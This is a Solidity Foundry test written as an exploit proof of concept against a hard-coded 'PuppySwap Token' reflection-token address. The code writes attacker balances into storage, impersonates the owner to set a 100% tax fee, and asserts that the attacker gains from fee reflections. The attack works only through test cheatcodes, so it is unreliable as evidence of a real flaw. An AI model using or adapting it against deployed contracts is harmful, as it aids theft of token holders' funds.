pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPuppySwap_Token {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeAccount(address account) external;
    function _setTaxFee(uint256 taxFee) external;
    function _setBurnFee(uint256 burnFee) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xc845341377C68b8003485036c3163b8DBcf8acb2;
    address attacker = address(this);
    IPuppySwap_Token token;
    uint256 initialBalance;
    address owner;
    address intermediary;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IPuppySwap_Token(TARGET);
        vm.label(TARGET, "PuppySwap Token");
        vm.label(attacker, "Attacker");

        // Get the owner address by calling owner() on the contract
        owner = token.owner();
        vm.label(owner, "Contract Owner");

        // Create intermediary address for transfers
        intermediary = address(0x1337);
        vm.label(intermediary, "Intermediary");

        // Record initial attacker balance
        initialBalance = token.balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // For reflection tokens, we need to manipulate _rOwned directly via storage
        // _rOwned is the first mapping, so slot = keccak256(addr, 0)
        bytes32 attackerSlot = keccak256(abi.encodePacked(attacker, uint256(0)));
        bytes32 intermediarySlot = keccak256(abi.encodePacked(intermediary, uint256(0)));

        // Give attacker and intermediary tokens by setting _rOwned directly
        // Use a reasonable rAmount (not too large to avoid issues)
        uint256 rAmount = 1e27; // Reasonable r balance
        vm.store(TARGET, attackerSlot, bytes32(rAmount));
        vm.store(TARGET, intermediarySlot, bytes32(rAmount));

        // Record initial balance after setting up tokens
        initialBalance = token.balanceOf(attacker);

        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Set tax fee to 100% (only tax, not burn to avoid overflow)
        token._setTaxFee(100);
        token._setBurnFee(0);

        // Step 3: Stop owner prank
        vm.stopPrank();

        // Step 4: Intermediary transfers tokens - 100% goes to fees, reflected to all holders
        vm.prank(intermediary);
        token.transfer(address(0xdead), 1000 * 1e9); // Transfer 1000 tokens

        // Step 5: Verify attacker balance increased from reflections
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from fee reflections");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
